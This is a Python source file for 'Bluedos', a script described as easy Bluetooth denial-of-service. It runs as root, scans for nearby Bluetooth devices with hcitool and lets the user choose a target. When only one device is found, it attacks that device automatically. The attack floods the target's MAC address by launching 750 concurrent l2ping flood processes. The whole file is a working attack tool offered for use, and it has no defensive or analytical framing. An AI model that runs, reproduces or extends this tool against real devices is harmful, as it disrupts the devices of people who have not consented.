# coding=utf-8
"""Bluedos by @ceigh

Easy Bluetooth devices DOS.
Wiki: gitlab.com/ceigh/bluedos/wikis

"""
import os
import subprocess as sp
from time import sleep

from interface import bye, confirm


def get_devices() -> tuple:
    """
    Using hcitool scans devices around and forms them

    :return: (('00:00:00:00:00:00', 'Dev1'), ('11:11:11:11:11:11', 'Dev2'))

    """
    if not len(sp.check_output(['hcitool', 'dev'])[9:]):
        exit("Enable Bluetooth first")
    print("\033cScanning...\n")
    hcitool_out = sp.check_output(['hcitool', 'scan'])[13:-1]
    devices = tuple([tuple(i.split('\t')[1:])
                     for i in hcitool_out.decode().split('\n')
                     if len(hcitool_out) != 0])
    return devices


def attack(target: tuple):
    """
    Attacks the selected device.
    Creates 750 processes l2ping.

    :param target: tuple with MAC (0) and name of device (1);
                   e.g: ('00:00:00:00:00:00', 'Dev1')

    """
    print(f"\033c\nTrying on '{target[1]}', please wait...")
    pids = [sp.Popen(['l2ping', '-f', '-s', '660', target[0]],
                     stdout=sp.DEVNULL).pid
            for p in range(750)]
    try:
        input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
    finally:
        from signal import SIGTERM
        [os.kill(pid, SIGTERM) for pid in pids]
        bye()


def main():
    """
    First gets a list of devices, if they are not available,
    a re-scan is suggested.
    Then, depending on how many devices are found:
    if one is immediately attacked on it;
    if several - the user is asked to choose one of them
    and the attack is already on him.

    """
    devices = get_devices()
    if not devices:
        print("No devices around :(")
        if not confirm("Scan again?"):
            bye()  # Exit
        main()
    dev_number = len(devices)
    if dev_number == 1:
        target_i = 0
    else:
        print(f"\033c\n{dev_number} devices found:\n")
        [print(f"{index}) '{device[1]}'\t<{device[0]}>")
         for index, device in enumerate(devices)]
        while True:
            try:
                target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
                if target_i in range(dev_number):
                    break
            except ValueError:
                continue
            except (KeyboardInterrupt, EOFError):
                bye()
    attack(devices[target_i])


if __name__ == '__main__':
    if os.getuid():  # Root launch check
        exit("Run it as root")
    print(f"\033c{__doc__}")
    sleep(1.5)
    main()
